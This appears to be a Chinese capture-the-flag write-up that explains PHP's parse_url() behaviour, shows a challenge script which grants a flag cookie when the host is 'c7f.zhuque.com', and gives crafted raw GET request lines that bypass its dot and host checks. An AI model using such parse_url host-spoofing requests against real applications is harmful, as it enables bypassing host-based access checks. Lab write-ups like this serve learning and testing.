```
 <?php
$url = 'http://username:password@hostname/path?arg=value#anchor';

print_r(parse_url($url));

echo parse_url($url, PHP_URL_PATH);
?> 
```

以上例程会输出：

```
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
/path
```

通过///x.php?key=value的方式可以使其返回false或null

### 解题步骤

问题代码

``` php+HTML
<?php
ini_set("display_errors",0);
$uri = $_SERVER['REQUEST_URI'];
if(stripos($uri,".")) //点符号不能出现在第二位及往后的位置，只能出现在第一位
{
    die("Unkonw URI.");
}
if(!parse_url($uri,PHP_URL_HOST))  //要让$url验证不符合URL格式，这时parse_url()会返回FALSE
{
    $uri = "http://".$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'];
}
$host = parse_url($uri,PHP_URL_HOST);
if($host === "c7f.zhuque.com"){
    setcookie("AuthFlag","flag{*******");
}
?>

```

$_SERVER['REQUEST_URL'] 的值

例如' http://123.56.74.233:12569/index.php?arg=value#anchor ';参数为/index.php?arg=value#anchor



GET请求改为

GET ..@c7f.zhuque.com/..//INDEX.PHP/  HTTP/1.1

或

GET .@c7f.zhuque.com/..//INDEX.PHP/  HTTP/1.1

或

GET ..@c7f.zhuque.com/..//INDEX.PHP/  HTTP/1.1

